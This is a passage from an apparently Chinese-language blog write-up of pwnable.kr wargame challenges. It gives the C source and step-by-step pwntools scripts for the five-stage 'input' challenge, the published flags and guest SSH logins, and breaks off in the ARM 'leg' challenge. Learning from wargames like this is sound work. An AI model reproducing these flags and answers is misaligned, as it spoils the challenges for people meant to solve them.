class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, rand() ^ <span class="number">0xdeadbeef</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果是 -1255736440</p><p>运行, 输入, GET FLAG!</p><p>flag为 <code>Mommy, I thought libc random is unpredictable...</code></p><h1 id="input"><a href="#input" class="headerlink" title="input"></a>input</h1><blockquote><p>Mom? how can I pass my input to a computer program?</p><p>ssh <a href="mailto:input2@pwnable.kr" target="_blank" rel="noopener">input2@pwnable.kr</a> -p2222 (pw:guest)</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to pwnable.kr\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Let's see if you know how to give input to program\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Just give me correct inputs then you will get the flag :)\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// argv</span></span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'A'</span>],<span class="string">"\x00"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'B'</span>],<span class="string">"\x20\x0a\x0d"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 1 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stdio</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 2 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// env</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">"\xca\xfe\xba\xbe"</span>, getenv(<span class="string">"\xde\xad\xbe\xef"</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 3 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// file</span></span><br><span class="line">    FILE* fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 4 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// network</span></span><br><span class="line">    <span class="keyword">int</span> sd, cd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">    sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"socket error, tell admin\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    saddr.sin_family = AF_INET;</span><br><span class="line">    saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    saddr.sin_port = htons( atoi(argv[<span class="string">'C'</span>]) );</span><br><span class="line">    <span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"bind error, use another port\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    listen(sd, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">    cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line">    <span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"accept error, tell admin\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 5 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// here's your flag</span></span><br><span class="line">    system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目有五关, 一个个分析吧</p><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// argv</span></span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'A'</span>],<span class="string">"\x00"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'B'</span>],<span class="string">"\x20\x0a\x0d"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 1 clear!\n"</span>);</span><br></pre></td></tr></table></figure><p>通过要求: 要有100个参数, 其中第 &#39;A&#39; 个为 &quot;\x00&quot;,<br>第 &#39;B&#39; 个为 &quot;\x20\x0a\x0d&quot;</p><p>一开始尝试用shell传递, <code>./input $(python -c &quot;xxx&quot;)</code> 这种,</p><p>无果, 于是试着直接用 Python,<br>但是因惯性思维影响在 Python 中还是继续传 &quot;\x00&quot;</p><p>忘记了空字符串末尾就有一个 &#39;\x00&#39;了</p><p>解题脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">'./test'</span>, *[<span class="string">'a'</span>] * <span class="number">64</span>, <span class="string">''</span>, <span class="string">'\x20\x0a\x0d'</span>, *[<span class="string">'a'</span>] * <span class="number">33</span>])</span><br><span class="line"></span><br><span class="line">print(io.recv())</span><br><span class="line"></span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stdio</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 2 clear!\n"</span>);</span><br></pre></td></tr></table></figure><p>分别从stdin和stderr读取四个字符, 要求分别是 &quot;\x00\x0a\x00\xff&quot;和 &quot;\x00\x0a\x02\xff&quot;</p><p>试了一下直接io.sendline() 果不其然地失败了, NUL是个不好处理的玩意儿啊</p><p>Google得知这个地方要用著名的IO重定向, 但是C语言代码太复杂了, 还是想用Python</p><p>Google了一下还是找到了做法, 不过很迷为什么StringIO/BytesIO不行呢, 会提示<br><code>io.UnsupportedOperation: not writable</code></p><p>创建临时文件总是感觉不是很干净</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'stdin.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">b'\x00\x0a\x00\xff'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'stderr.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">b'\x00\x0a\x02\xff'</span>)</span><br><span class="line"></span><br><span class="line">stdin  = open(<span class="string">'stdin.txt'</span>, <span class="string">'rb'</span>)</span><br><span class="line">stderr = open(<span class="string">'stderr.txt'</span>, <span class="string">'rb'</span>)</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">'./test'</span>, *[<span class="string">'a'</span>] * <span class="number">64</span>, <span class="string">''</span>, <span class="string">'\x20\x0a\x0d'</span>, *[<span class="string">'a'</span>] * <span class="number">33</span>], stdin=stdin, stderr=stderr)</span><br><span class="line"></span><br><span class="line">print(io.recv())</span><br></pre></td></tr></table></figure><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// env</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">"\xca\xfe\xba\xbe"</span>, getenv(<span class="string">"\xde\xad\xbe\xef"</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 3 clear!\n"</span>);</span><br></pre></td></tr></table></figure><p>第三关要求环境变量 &quot;\xde\xad\xbe\xef&quot; 的值为 &quot;\xca\xfe\xba\xbe&quot;</p><p>process的env参数可以指定环境变量, 这关不难</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">env = &#123;</span><br><span class="line">    <span class="string">b'\xde\xad\xbe\xef'</span>: <span class="string">b'\xca\xfe\xba\xbe'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">'./test'</span>, *[<span class="string">'a'</span>] * <span class="number">64</span>, <span class="string">''</span>, <span class="string">'\x20\x0a\x0d'</span>, *[<span class="string">'a'</span>] * <span class="number">33</span>], env=env, stdin=stdin, stderr=stderr)</span><br></pre></td></tr></table></figure><h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FILE* fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"r"</span>);</span><br><span class="line"><span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 4 clear!\n"</span>);</span><br></pre></td></tr></table></figure><p>第四关, 以只读模式打开 &quot;\x0a&quot; 文件, 读取四个字节, 要求是四个NUL</p><p>直接建个文件就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'\x0a'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">b'\x00\x00\x00\x00'</span>)</span><br></pre></td></tr></table></figure><h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// network</span></span><br><span class="line"><span class="keyword">int</span> sd, cd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"socket error, tell admin\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line">saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">saddr.sin_port = htons( atoi(argv[<span class="string">'C'</span>]) );</span><br><span class="line"><span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"bind error, use another port\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">listen(sd, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line"><span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"accept error, tell admin\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 5 clear!\n"</span>);</span><br></pre></td></tr></table></figure><p>一脸懵逼  </p><p>查了下大概就是监听了argv[&#39;C&#39;] 所表示的端口,<br>直接用 remote 连接就可以发送数据了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">io = process([<span class="string">'./test'</span>, *[<span class="string">'a'</span>] * <span class="number">64</span>, <span class="string">''</span>, <span class="string">'\x20\x0a\x0d'</span>, <span class="string">'23233'</span>, *[<span class="string">'a'</span>] * <span class="number">32</span>], env=env, stdin=stdin, stderr=stderr)</span><br><span class="line"></span><br><span class="line">net = remote(<span class="string">'127.0.0.1'</span>, <span class="number">23233</span>)</span><br><span class="line">net.send(<span class="string">b'\xde\xad\xbe\xef'</span>)</span><br><span class="line">net.close()</span><br></pre></td></tr></table></figure><p>在写这关的时候, 我发现了几件比较悲剧的事情</p><ul><li>我用的是Python3</li><li>我在题目服务器上没有权限在当前创建文件</li></ul><p>第一点改一改 process 第一个参数的生成方式, 不要用Python3的 <code>*</code> 就行了</p><p>第二点可以将 CWD设 置为 /tmp/, /tmp/下我拥有创建文件的权限,<br>不过需要注意这样就必须将 input 路径写全 <a href="https://stackoverflow.com/questions/15725273/python-oserror-errno-2-no-such-file-or-directory" target="_blank" rel="noopener">python-oserror-errno-2-no-such-file-or-directory</a></p><p>然而又发现虽然这样五关都过了, 但是身在/tmp/目录的 process 读不到 /homt/input2 下的flag文件...</p><p>试着建立了symbolic link, 但还是读不到</p><p>后来去吃饭电脑休眠, 回来后重连ssh的时候发现了这么一段话</p><blockquote><p>files under /tmp can be erased anytime. make your directory under /tmp</p></blockquote><p>然后在/tmp下创建新目录, 再cd进去 <code>ln -s /home/input2/flag flag</code> 可算成功了</p><h2 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'/tmp/zhonghua'</span>):</span><br><span class="line">    os.mkdir(<span class="string">'/tmp/zhonghua'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'MANJARO'</span> <span class="keyword">in</span> platform.platform():</span><br><span class="line">    pwd = <span class="string">'/home/zhonghua/writeup/pwnable.kr/'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    pwd = <span class="string">'/home/input2/'</span></span><br><span class="line"></span><br><span class="line">port = randint(<span class="number">10000</span>, <span class="number">65535</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'/tmp/zhonghua/stdin.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">b'\x00\x0a\x00\xff'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'/tmp/zhonghua/stderr.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">b'\x00\x0a\x02\xff'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'/tmp/zhonghua/\x0a'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">b'\x00\x00\x00\x00'</span>)</span><br><span class="line"></span><br><span class="line">stdin  = open(<span class="string">'/tmp/zhonghua/stdin.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line">stderr = open(<span class="string">'/tmp/zhonghua/stderr.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line">env = &#123;</span><br><span class="line">    <span class="string">b'\xde\xad\xbe\xef'</span>: <span class="string">b'\xca\xfe\xba\xbe'</span>,</span><br><span class="line">    <span class="string">'PWD'</span>: pwd</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">arg = [pwd + <span class="string">'input'</span>] + [<span class="string">'a'</span>] * <span class="number">64</span> + [<span class="string">''</span>, <span class="string">'\x20\x0a\x0d'</span>, str(port)] + [<span class="string">'a'</span>] * <span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面的代码不兼容python2.....</span></span><br><span class="line"><span class="comment"># io = process(['./test', *['a'] * 64, '', '\x20\x0a\x0d', '23233', *['a'] * 32], env=env, stdin=stdin, stderr=stderr)</span></span><br><span class="line">io = process(arg, cwd=<span class="string">'/tmp/zhonghua/'</span>, env=env, stdin=stdin, stderr=stderr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 先等它准备好...</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">net = remote(<span class="string">'localhost'</span>, port)</span><br><span class="line">net.send(<span class="string">b'\xde\xad\xbe\xef'</span>)</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">print(io.recv().decode())</span><br><span class="line"></span><br><span class="line">net.close()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><p>flag为 <code>Mommy! I learned how to pass various input in Linux :)</code></p><p><del>到头来其实根本没比C语言简单</del></p><h1 id="leg"><a href="#leg" class="headerlink" title="leg"></a>leg</h1><blockquote><p>Daddy told me I should study arm.<br>But I prefer to study my leg!</p><p>Download : <a href="http://pwnable.kr/bin/leg.c" target="_blank" rel="noopener">http://pwnable.kr/bin/leg.c</a><br>Download : <a href="http://pwnable.kr/bin/leg.asm" target="_blank" rel="noopener">http://pwnable.kr/bin/leg.asm</a></p><p>ssh <a href="mailto:leg@pwnable.kr" target="_blank" rel="noopener">leg@pwnable.kr</a> -p2222 (pw:guest)</p></blockquote><p>看不懂看不懂, 这是什么俚语吗</p><p>首先放代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"mov r3, pc\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">"push   &#123;r6&#125;\n"</span></span><br><span class="line">    <span class="string">"add    r6, pc, $1\n"</span></span><br><span class="line">    <span class="string">"bx r6\n"</span></span><br><span class="line">    <span class="string">".code   16\n"</span></span><br><span class="line">    <span class="string">"mov    r3, pc\n"</span></span><br><span class="line">    <span class="string">"add    r3, $0x4\n"</span></span><br><span class="line">    <span class="string">"push   &#123;r3&#125;\n"</span></span><br><span class="line">    <span class="string">"pop    &#123;pc&#125;\n"</span></span><br><span class="line">    <span class="string">".code  32\n"</span></span><br><span class="line">    <span class="string">"pop    &#123;r6&#125;\n"</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key3</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"mov r3, lr\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> 